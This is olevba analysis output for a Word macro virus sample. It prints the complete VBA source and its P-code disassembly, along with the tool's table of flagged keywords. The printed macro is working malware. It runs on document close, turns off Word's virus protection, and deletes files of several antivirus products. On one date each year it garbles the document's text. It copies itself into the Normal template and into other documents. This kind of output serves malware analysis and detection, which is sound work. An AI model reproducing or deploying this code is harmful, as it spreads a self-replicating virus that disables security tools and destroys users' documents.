olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK2.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK2.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gp808.bas 
in file: Virus.MSWord.VMPCK2.h - OLE stream: 'Macros/VBA/Gp808'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Gp808").Export "C:\Gp808.sys"
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
If Day(Now()) = 14 And Month(Now()) = 7 Then
Dim a As Variant
Dim b As Variant
Selection.WholeStory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.WholeStory
Selection.Cut
WordBasic.Insert e$
End If
Set Nw807 = ActiveDocument.VBProject.VBComponents
Set Ru898 = NormalTemplate.VBProject.VBComponents
For y = 1 To Ru898.Count
If Ru898(y).Name = "Gp808" Then Nw515 = True
Next y
For y = 1 To Nw807.Count
If Nw807(y).Name = "Gp808" Then Ew593 = True
Next y
If Nw515 = True And Ew593 = True Then Exit Sub
If Nw515 = True And Ew593 <> True Then Nw807.Import "c:\Gp808.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Nw515 <> True And Ew593 = True Then Ru898.Import "c:\Gp808.sys": NormalTemplate.Save
End Sub
Sub ExtrasMakro()
End Sub
Sub AnsichtCode()
End Sub
Sub AnsichtVBCode()
End Sub
Sub DateiDokVorlagen()
End Sub
Sub FormatFormatvorlage()
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPCK2.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Gp808 - 4081 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #4:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #5:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #6:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #8:
' 	EndWith 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #12:
' 	EndWith 
' Line #13:
' 	LitStr 0x000C "C:\Gp808.sys"
' 	LitStr 0x0005 "Gp808"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #14:
' 	LitStr 0x0021 "C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #15:
' 	LitStr 0x0023 "C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #16:
' 	LitStr 0x0029 "C:\Programme\Norton Antivirus\V32scan.dll"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #17:
' 	LitStr 0x0029 "C:\Programme\Norton Antivirus\Virscan.dat"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #18:
' 	LitStr 0x001A "C:\PROGRAMME\TBAV\TBAV.DAT"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #19:
' 	LitStr 0x0010 "C:\TBAV\TBAV.DAT"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #20:
' 	LitStr 0x0030 "C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #22:
' 	Dim 
' 	VarDefn a (As Variant)
' Line #23:
' 	Dim 
' 	VarDefn B (As Variant)
' Line #24:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #25:
' 	Ld Selection 
' 	St a 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' Line #27:
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B 
' Line #28:
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St c 
' Line #29:
' 	Ld c 
' 	LitDI2 0x001D 
' 	Add 
' 	St d 
' Line #30:
' 	Ld d 
' 	LitDI2 0x00C7 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x001E 
' 	St c 
' 	EndIf 
' Line #31:
' 	Ld e$ 
' 	Ld d 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e$ 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #34:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #35:
' 	Ld e$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Nw807 
' Line #38:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Ru898 
' Line #39:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Ru898 
' 	MemLd Count 
' 	For 
' Line #40:
' 	Ld y 
' 	ArgsLd Ru898 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Gp808"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nw515 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Nw807 
' 	MemLd Count 
' 	For 
' Line #43:
' 	Ld y 
' 	ArgsLd Nw807 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Gp808"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ew593 
' 	EndIf 
' Line #44:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Ld Nw515 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Ew593 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #46:
' 	Ld Nw515 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Ew593 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\Gp808.sys"
' 	Ld Nw807 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #47:
' 	Ld Nw515 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld Ew593 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\Gp808.sys"
' 	Ld Ru898 
' 	ArgsMemCall Import 0x0001 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub ExtrasMakro())
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub AnsichtCode())
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub AnsichtVBCode())
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub DateiDokVorlagen())
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FormatFormatvorlage())
' Line #58:
' 	EndSub 
' Line #59:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

